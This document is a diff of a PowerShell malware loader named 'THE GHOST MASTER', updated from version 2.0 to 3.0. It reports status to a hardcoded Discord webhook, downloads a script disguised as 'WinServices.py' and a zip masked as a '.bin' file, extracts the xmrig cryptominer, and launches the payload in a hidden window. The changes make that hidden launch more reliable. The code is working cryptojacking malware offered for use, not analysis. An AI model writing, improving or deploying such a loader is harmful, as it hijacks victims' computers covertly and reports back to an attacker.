@@ -1,4 +1,4 @@
-# --- THE GHOST MASTER (VERSION 2.0 - TELEMETRY ENABLED) ---
+# --- THE GHOST MASTER (VERSION 3.0 - THE BULLETPROOF VEST) ---
 $WEBHOOK = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
 function Send-Ghost { param($msg) try { $json = @{content="[GHOST STATUS] $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }
 
@@ -36,7 +36,6 @@ Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
 Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdataData.bin"
 
 if (Test-Path "$Path\UpdataData.bin") {
-    # Flip the mask back to .zip and extract
     Rename-Item -Path "$Path\UpdataData.bin" -NewName "UpdataData.zip" -Force
     Expand-Archive -Path "$Path\UpdataData.zip" -DestinationPath $Path -Force
     $Miner = Get-ChildItem -Path $Path -Filter "xmrig.exe" -Recurse | Select-Object -First 1
@@ -44,12 +43,13 @@ if (Test-Path "$Path\UpdataData.bin") {
     Send-Ghost "Shadow Payloads Armed."
 } else { Send-Ghost "FATAL: Payload Download Failed."; exit }
 
-# 4. Activation
+# 4. ACTIVATION (THE BULLETPROOF FIX)
 Send-Ghost "Engaging Ghost Mode..."
 $PY_EXEC = "$Path\python\pythonw.exe"
 if (Test-Path $PY_EXEC) {
-    # Launch WinServices.py. Note: WinServices.py will handle its own bootstrap if libs are missing.
-    Start-Process -FilePath $PY_EXEC -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WindowStyle Hidden
+    # FIX: We set the Python path and working directory so it NEVER fails to find its voice
+    $Args = "`"$Path\WinServices.py`" --id $ID"
+    Start-Process -FilePath $PY_EXEC -ArgumentList $Args -WorkingDirectory $Path -WindowStyle Hidden
     Send-Ghost "Engine Released. Check Telemetry."
 } else {
     Send-Ghost "FATAL: Python Executable not found at $PY_EXEC"
